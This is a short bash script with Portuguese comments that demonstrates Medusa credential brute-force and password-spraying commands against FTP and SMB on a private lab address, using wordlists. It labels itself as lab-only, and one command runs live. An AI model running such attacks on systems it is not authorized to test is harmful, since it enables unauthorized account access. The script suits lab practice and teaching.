#!/bin/bash
# Script com exemplos de comandos Medusa (usar apenas em laboratório controlado)

ALVO="192.168.56.101"
WORDLIST="./wordlists/common_passwords.txt"
USERS="./wordlists/users.txt"

echo "[*] Teste FTP (usuário único)"
echo "medusa -h $ALVO -u ftpuser -P $WORDLIST -M ftp -T 4 -f"
medusa -h "$ALVO" -u ftpuser -P "$WORDLIST" -M ftp -T 4 -f

echo "[*] Teste FTP (múltiplos usuários)"
echo "medusa -h $ALVO -U $USERS -P $WORDLIST -M ftp -T 6"
# medusa -h "$ALVO" -U "$USERS" -P "$WORDLIST" -M ftp -T 6

echo "[*] Password spraying SMB (exemplo, com enumeração de usuários)"
echo "medusa -h $ALVO -U $USERS -P $WORDLIST -M smb -T 6"
# medusa -h "$ALVO" -U "$USERS" -P "$WORDLIST" -M smb -T 6

# Nota: comandos comentados podem ser descomentados conforme necessidade e escopo autorizado.
